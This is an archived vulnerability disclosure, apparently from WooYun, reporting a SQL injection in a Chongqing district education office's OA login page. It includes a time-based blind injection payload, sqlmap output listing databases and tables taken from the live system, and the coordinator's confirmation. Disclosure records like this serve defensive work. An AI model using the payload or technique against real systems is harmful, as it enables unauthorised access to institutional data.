wybug_title: 重庆市某区教育委员会核心系统存在SQL注入
wybug_corp: 重庆市某区教育委员会
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-08-30：	细节已通知厂商并且等待厂商处理中									2015-09-02：	cncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开									2015-09-12：	细节向核心白帽子及相关领域专家公开									2015-09-22：	细节向普通白帽子公开									2015-10-02：	细节向实习白帽子公开									2015-10-17：	细节向公众公开  简要描述： RT 详细说明：  OA系统：http://**.**.**.**/
GET /oa/login/login.jsp?pin=admin&password=admin HTTP/1.1Host: **.**.**.**:8080Proxy-Connection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36Referer: http://**.**.**.**/Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=4DC9E8C5AC768B299E24AFE2D335E020
pin参数存在MySQL时间注入
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: pin (GET)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: pin=admin' AND (SELECT * FROM (SELECT(SLEEP(5)))fKCF) AND 'lQgV'='lQgV&password=admin---[18:34:10] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12
   漏洞证明：  数据库：


[18:34:10] [INFO] resumed: site[18:34:10] [INFO] fetching tables for databases: 'cwbb, information_schema, joa, site'[18:34:10] [INFO] fetching number of tables for database 'joa'[18:34:10] [WARNING] time-based comparison requires larger statistical model, please wait..............................[18:34:14] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y1[18:34:33] [INFO] adjusting time delay to 1 second due to good response times02[18:34:37] [INFO] retrieved: 采购目录[18:36:51] [INFO] retrieved: addr_folder[18:37:55] [INFO] retrieved: addr_folderuser[18:38:31] [INFO] retrieved: addr_fser[18:39:02] [INFO] retrieved: calendar_info[18:40:17] [INFO] retrieved: calendar_read[18:40:49] [INFO] retrieved: car_accident[18:41:47] [INFO] retrieved: car_consume[18:42:34] [INFO] retrieved: car_driver[18:43:13] [INFO] retrieved: car_info[18:43:44] [INFO] retrieved: car_usage[18:44:16] [INFO] retrieved: clientinfo[18:45:11] [INFO] retrieved: department[18:46:11] [INFO] retrieved: dm_budget[18:46:59] [INFO] retrieved: dm_deptcy[18:47:44] [INFO] retrieved: dm_flowtype

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-09-02 10:49 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给重庆分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
